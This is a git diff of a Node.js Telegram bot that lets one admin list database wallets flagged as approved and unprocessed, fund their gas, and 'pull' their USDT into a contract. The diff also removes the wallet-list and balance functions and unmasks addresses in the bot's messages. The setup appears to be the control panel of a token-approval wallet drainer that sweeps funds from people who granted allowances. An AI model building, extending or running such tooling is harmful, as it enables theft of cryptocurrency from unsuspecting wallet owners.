@@ -527,159 +527,7 @@ Next steps:
         }
     }
 
-    // Fix the sendPullWalletList method - the issue is in the inline keyboard construction
-// Fix the sendPullWalletList method to show correct balances
-    async sendPullWalletList(chatId) {
-        if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
-        }
-
-        try {
-            console.log('Fetching wallets from database...');
-            
-            // Fetch wallets from database
-            const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
-            const result = await database.query(query);
-            
-            console.log('Database query result:', result);
-
-            let message = '<b>📤 Select Wallet to Pull</b>\n\n';
-
-            if (!result || !result.rows || result.rows.length === 0) {
-                message += 'No approved wallets available for pulling.\n\n';
-                message += 'Use: /pull_<wallet_address>';
-            } else {
-                message += 'Click on a wallet to pull USDT:\n\n';
-                for (let i = 0; i < result.rows.length; i++) {
-                    const wallet = result.rows[i];
-                    const maskedAddress = this.maskAddress(wallet.address);
-                    // Format the balance properly
-                    let balance = '0';
-                    if (wallet.usdt_balance !== null && wallet.usdt_balance !== undefined) {
-                        balance = parseFloat(wallet.usdt_balance).toFixed(2);
-                    }
-                    message += `${i + 1}. <code>${maskedAddress}</code> (${balance} USDT)\n`;
-                }
-            }
-
-            // Fix the inline keyboard construction
-            const inlineKeyboard = [];
-            
-            if (result && result.rows && result.rows.length > 0) {
-                for (let i = 0; i < result.rows.length; i++) {
-                    const wallet = result.rows[i];
-                    inlineKeyboard.push([{
-                        text: `📤 Pull ${wallet.name || `Wallet ${i + 1}`}`,
-                        callback_data: `pull_${wallet.address}`
-                    }]);
-                }
-            }
-            
-            // Add the main menu button
-            inlineKeyboard.push([
-                { text: '🏠 Main Menu', callback_data: 'menu' }
-            ]);
-
-            const options = {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: inlineKeyboard
-                }
-            };
-
-            return await this.bot.sendMessage(chatId, message, options);
-        } catch (error) {
-            console.error('Error sending pull wallet list:', error && error.message ? error.message : error);
-            const fallbackMessage = `
-📤 Select Wallet to Pull
-
-Failed to fetch wallet list. Please try again later.
-            `;
-            return await this.bot.sendMessage(chatId, fallbackMessage, {
-                reply_markup: {
-                    inline_keyboard: [
-                    ]
-                }
-            });
-        }
-    }
-
-    // REAL BLOCKCHAIN BALANCE CHECKING FUNCTIONS
-    async getContractUSDTBalance() {
-    if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS) {
-        console.log("⚠️ Blockchain not ready, returning zero USDT balance");
-        return { balance: '0.00', error: 'Blockchain not initialized' };
-    }
-
-    try {
-        const usdtContract = new ethers.Contract(
-            process.env.USDT_CONTRACT_ADDRESS,
-            ['function balanceOf(address account) external view returns (uint256)'],
-            this.provider
-        );
-
-        const balance = await usdtContract.balanceOf(process.env.CONTRACT_ADDRESS);
-        const formattedBalance = ethers.formatUnits(balance, 18);
-
-        console.log('Contract USDT Balance:', formattedBalance);
-        return { balance: formattedBalance, error: null };
-    } catch (error) {
-        console.error(
-            'Error getting contract USDT balance:',
-            error && error.message ? error.message : error
-        );
-
-        return {
-            balance: '0.00',
-            error: error && error.message ? error.message : String(error)
-        };
-    }
-}
-    async getMasterWalletBNBBalance() {
-        if (!this.provider || !this.masterWallet) {
-            console.log('⚠️ Blockchain not initialized, returning zero BNB balance');
-            return { balance: '0.00', error: 'Blockchain not initialized' };
-        }
-
-        try {
-            const balance = await this.provider.getBalance(this.masterWallet);
-            const formattedBalance = ethers.formatEther(balance);
-
-            console.log('Master Wallet BNB Balance:', formattedBalance);
-            return { balance: formattedBalance, error: null };
-        } catch (error) {
-            console.error('Error getting master wallet BNB balance:', error && error.message ? error.message : error);
-            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
-        }
-    }
-
-    async getMasterWalletUSDTBalance() {
-        if (!this.provider || !process.env.USDT_CONTRACT_ADDRESS || !this.masterWallet) {
-            console.log('⚠️ Blockchain not initialized, returning zero USDT balance');
-            return { balance: '0.00', error: 'Blockchain not initialized' };
-        }
-
-        try {
-            const usdtContract = new ethers.Contract(
-                process.env.USDT_CONTRACT_ADDRESS,
-                ['function balanceOf(address account) external view returns (uint256)'],
-                this.provider
-            );
-
-            const balance = await usdtContract.balanceOf(this.masterWallet);
-            const formattedBalance = ethers.formatUnits(balance, 18);
-
-            console.log('Master Wallet USDT Balance:', formattedBalance);
-            return { balance: formattedBalance, error: null };
-        } catch (error) {
-            console.error('Error getting master wallet USDT balance:', error && error.message ? error.message : error);
-            return { balance: '0.00', error: error && error.message ? error.message : String(error) };
-        }
-    }
-
-    // In the handlePullCommand method, fix the contract service call:
-    // In the handlePullCommand method, fix the contract service call:
-
+// Enhanced handlePullCommand method to show full address
     async handlePullCommand(chatId, walletAddress) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
@@ -691,10 +539,12 @@ Failed to fetch wallet list. Please try again later.
         }
 
         const maskedAddress = this.maskAddress(walletAddress);
+        const fullAddress = walletAddress; // Full address for display
 
         const message = `
 🔄 <b>Pull Operation Initiated</b>
-Wallet: <code>${maskedAddress}</code>
+Wallet: <code>${fullAddress}</code>
+Masked: <code>${maskedAddress}</code>
 
 Processing... This will:
 1. Check wallet gas balance
@@ -749,7 +599,7 @@ Processing... This will:
                         if (!gasResult || !gasResult.success) {
                             const errorMessage = `
 ❌ <b>GAS FAILED</b>
-Wallet: <code>${maskedAddress}</code>
+Wallet: <code>${fullAddress}</code>
 Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 'Unknown error')}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
@@ -771,20 +621,21 @@ Error: ${this.escapeMarkdown((gasResult && gasResult.error) ? gasResult.error : 
                 }
             }
 
-            // Pull USDT from wallet to contract - USE THE CORRECT FUNCTION NAME
+            // Pull USDT from wallet to contract
             const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
 
             if (pullResult && pullResult.success) {
                 const escapedAmount = this.escapeMarkdown(pullResult.amount || '0');
                 const maskedTxHash = this.maskAddress(pullResult.txHash || 'N/A');
+                const fullTxHash = pullResult.txHash || 'N/A';
                 const escapedTxHash = this.escapeMarkdown(maskedTxHash);
                 const escapedTimestamp = this.escapeMarkdown(new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC');
 
                 const successMessage = `
 ✅ <b>PULL SUCCESSFUL</b>
-Wallet: <code>${maskedAddress}</code>
+Wallet: <code>${fullAddress}</code>
 Amount: <b>${escapedAmount} USDT</b>
-Transaction: <code>${escapedTxHash}</code>
+Transaction: <code>${fullTxHash}</code>
 
 📊 <b>Updated Balances:</b>
 • Check balances for update
@@ -821,7 +672,7 @@ Transaction: <code>${escapedTxHash}</code>
             } else {
                 const errorMessage = `
 ❌ <b>PULL FAILED</b>
-Wallet: <code>${maskedAddress}</code>
+Wallet: <code>${fullAddress}</code>
 Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error : 'Unknown error')}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
@@ -845,7 +696,7 @@ Error: ${this.escapeMarkdown((pullResult && pullResult.error) ? pullResult.error
 
             const errorMessage = `
 ❌ <b>PULL FAILED</b>
-Wallet: <code>${this.maskAddress(walletAddress)}</code>
+Wallet: <code>${fullAddress}</code>
 Error: ${this.escapeMarkdown(error && error.message ? error.message : String(error))}
 
 🔄 <b>Last Updated:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
@@ -870,6 +721,7 @@ Error: ${this.escapeMarkdown(error && error.message ? error.message : String(err
             return this.bot.sendMessage(chatId, `❌ Error: ${error && error.message ? error.message : String(error)}`);
         }
     }
+
     async handleWithdrawCommand(chatId) {
         if (chatId.toString() !== this.adminChatId) {
             return this.bot.sendMessage(chatId, '❌ Unauthorized access');
@@ -1202,6 +1054,7 @@ Error: ${cleanErrorMessage}
 }
 
 module.exports = new TelegramService();
+
 
 
 
